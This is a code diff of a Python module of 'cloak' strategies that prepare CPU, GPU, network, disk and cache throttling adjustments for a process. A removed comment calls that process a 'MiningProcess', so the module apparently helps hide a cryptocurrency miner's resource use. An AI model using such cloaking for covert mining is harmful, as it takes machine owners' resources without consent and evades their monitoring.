@@ -24,39 +24,35 @@ class CloakStrategy:
 class CpuCloakStrategy(CloakStrategy):
     """
     Cloaking strategy for CPU.
-    Throttles CPU frequency and reduces CPU threads.
+    Throttles CPU frequency and reduces CPU threads if needed.
     """
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         self.throttle_percentage = config.get('throttle_percentage', 20)
         self.freq_adjustment = config.get('frequency_adjustment_mhz', 2000)
         self.logger = logger
 
-    @retry(Exception, tries=3, delay=2000, backoff=2)
+    @retry(Exception, tries=3, delay=2, backoff=2)  # [CHANGES] rút gọn delay
     def apply(self, process: Any) -> Dict[str, Any]:
-        """
-        Determine the CPU throttling adjustments for the process.
-
-        Returns:
-            Dict[str, Any]: Adjustments for CPU frequency and threads.
-        """
         try:
-            if not process.pid:
+            if not getattr(process, 'pid', None):
                 self.logger.error("Process PID is not available.")
                 return {}
 
+            # [CHANGES] Không so sánh dict < dict, chỉ trả về adjustments dict
             adjustments = {
                 'cpu_freq': self.freq_adjustment,
-                # Có thể thêm điều chỉnh số luồng CPU nếu cần
+                # Có thể thêm 'cpu_threads' nếu muốn giảm CPU thread
             }
             self.logger.info(
-                f"Prepared CPU throttling adjustments: frequency={self.freq_adjustment}MHz "
+                f"Prepared CPU throttling adjustments: freq={self.freq_adjustment}MHz "
                 f"({self.throttle_percentage}% reduction) for process {process.name} (PID: {process.pid})."
             )
             return adjustments
 
         except Exception as e:
             self.logger.error(
-                f"Error preparing CPU throttling for process {process.name} (PID: {process.pid}): {e}"
+                f"Error preparing CPU throttling for process {getattr(process, 'name', 'unknown')} "
+                f"(PID: {getattr(process, 'pid', 'N/A')}): {e}"
             )
             raise
 
@@ -70,14 +66,8 @@ class GpuCloakStrategy(CloakStrategy):
         self.logger = logger
         self.gpu_initialized = gpu_initialized
 
-    @retry(Exception, tries=3, delay=2000, backoff=2)
+    @retry(Exception, tries=3, delay=2, backoff=2)
     def apply(self, process: Any) -> Dict[str, Any]:
-        """
-        Determine the GPU throttling adjustments for the process.
-
-        Returns:
-            Dict[str, Any]: Adjustments for GPU power limit.
-        """
         if not self.gpu_initialized:
             self.logger.warning(
                 f"GPU not initialized. Cannot prepare GPU throttling for process {process.name} (PID: {process.pid})."
@@ -85,6 +75,7 @@ class GpuCloakStrategy(CloakStrategy):
             return {}
 
         try:
+            pynvml.nvmlInit()
             GPU_COUNT = pynvml.nvmlDeviceGetCount()
             if GPU_COUNT == 0:
                 self.logger.warning("No GPUs found on the system.")
@@ -106,9 +97,10 @@ class GpuCloakStrategy(CloakStrategy):
                 'gpu_power_limit': new_power_limit
             }
             self.logger.info(
-                f"Prepared GPU throttling adjustments: GPU {gpu_index} power limit={new_power_limit}W "
+                f"Prepared GPU throttling adjustments: GPU {gpu_index} power limit={new_power_limit} "
                 f"({self.throttle_percentage}% reduction) for process {process.name} (PID: {process.pid})."
             )
+            pynvml.nvmlShutdown()
             return adjustments
 
         except pynvml.NVMLError as e:
@@ -125,15 +117,9 @@ class GpuCloakStrategy(CloakStrategy):
     def assign_gpu(self, pid: int, gpu_count: int) -> int:
         """
         Assign a GPU to a process based on PID.
-
-        Args:
-            pid (int): Process ID.
-            gpu_count (int): Total number of GPUs available.
-
-        Returns:
-            int: Assigned GPU index, or -1 if none found.
         """
         try:
+            # [CHANGES] Tránh so sánh dict < dict, chỉ thực hiện mod
             return pid % gpu_count
         except Exception as e:
             self.logger.error(f"Error assigning GPU based on PID: {e}")
@@ -154,12 +140,6 @@ class NetworkCloakStrategy(CloakStrategy):
             self.logger.info(f"Primary network interface determined: {self.network_interface}")
 
     def get_primary_network_interface(self) -> str:
-        """
-        Determine the primary network interface.
-
-        Returns:
-            str: Name of the primary network interface.
-        """
         try:
             output = subprocess.check_output(['ip', 'route']).decode()
             for line in output.splitlines():
@@ -170,23 +150,22 @@ class NetworkCloakStrategy(CloakStrategy):
             self.logger.error(f"Error getting primary network interface: {e}")
             return 'eth0'
 
-    @retry(Exception, tries=3, delay=2000, backoff=2)
+    @retry(Exception, tries=3, delay=2, backoff=2)
     def apply(self, process: Any) -> Dict[str, Any]:
-        """
-        Determine the network throttling adjustments for the process.
-
-        Returns:
-            Dict[str, Any]: Adjustments for network bandwidth.
-        """
         try:
+            # [CHANGES] Kiểm tra process có 'mark' không, tránh lỗi KeyError
+            mark_value = getattr(process, 'mark', None)
             adjustments = {
                 'network_interface': self.network_interface,
                 'bandwidth_limit_mbps': self.bandwidth_reduction_mbps,
-                'process_mark': process.mark  # Assumes MiningProcess has a 'mark' attribute
             }
+            # Nếu process có attribute 'mark', ta thêm vào
+            if mark_value is not None:
+                adjustments['process_mark'] = mark_value
+
             self.logger.info(
                 f"Prepared Network throttling adjustments: interface={self.network_interface}, "
-                f"bandwidth_limit={self.bandwidth_reduction_mbps}Mbps, mark={process.mark} "
+                f"bandwidth_limit={self.bandwidth_reduction_mbps}Mbps, mark={mark_value} "
                 f"for process {process.name} (PID: {process.pid})."
             )
             return adjustments
@@ -205,16 +184,10 @@ class DiskIoCloakStrategy(CloakStrategy):
         self.io_throttling_level = config.get('io_throttling_level', 'idle')
         self.logger = logger
 
-    @retry(Exception, tries=3, delay=2000, backoff=2)
+    @retry(Exception, tries=3, delay=2, backoff=2)
     def apply(self, process: Any) -> Dict[str, Any]:
-        """
-        Determine the Disk I/O throttling adjustments for the process.
-
-        Returns:
-            Dict[str, Any]: Adjustments for Disk I/O throttling.
-        """
         try:
-            ionice_class = '3' if self.io_throttling_level.lower() == 'idle' else '2'  # Example: '3' for idle, '2' for best-effort
+            ionice_class = '3' if self.io_throttling_level.lower() == 'idle' else '2'
             adjustments = {
                 'ionice_class': ionice_class
             }
@@ -233,20 +206,13 @@ class CacheCloakStrategy(CloakStrategy):
     """
     Cloaking strategy for Cache.
     Reduces cache usage by dropping caches.
-    Note: This affects the entire system and not just the specific process.
     """
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         self.cache_limit_percent = config.get('cache_limit_percent', 50)
         self.logger = logger
 
-    @retry(Exception, tries=3, delay=2000, backoff=2)
+    @retry(Exception, tries=3, delay=2, backoff=2)
     def apply(self, process: Any) -> Dict[str, Any]:
-        """
-        Determine the Cache throttling adjustments.
-
-        Returns:
-            Dict[str, Any]: Adjustments for Cache throttling.
-        """
         try:
             if os.geteuid() != 0:
                 self.logger.error(
@@ -276,8 +242,9 @@ class CacheCloakStrategy(CloakStrategy):
             raise
 
 class CloakStrategyFactory:
-    """Factory để tạo các instance của các chiến lược cloaking."""
-
+    """
+    Factory để tạo các instance của các chiến lược cloaking.
+    """
     _strategies: Dict[str, Type[CloakStrategy]] = {
         'cpu': CpuCloakStrategy,
         'gpu': GpuCloakStrategy,
@@ -288,7 +255,9 @@ class CloakStrategyFactory:
     }
 
     @staticmethod
-    def create_strategy(strategy_name: str, config: Dict[str, Any], logger: logging.Logger, gpu_initialized: bool = False) -> Optional[CloakStrategy]:
+    def create_strategy(strategy_name: str, config: Dict[str, Any],
+                        logger: logging.Logger, gpu_initialized: bool = False
+    ) -> Optional[CloakStrategy]:
         strategy_class = CloakStrategyFactory._strategies.get(strategy_name.lower())
         if strategy_class:
             if strategy_name.lower() == 'gpu':
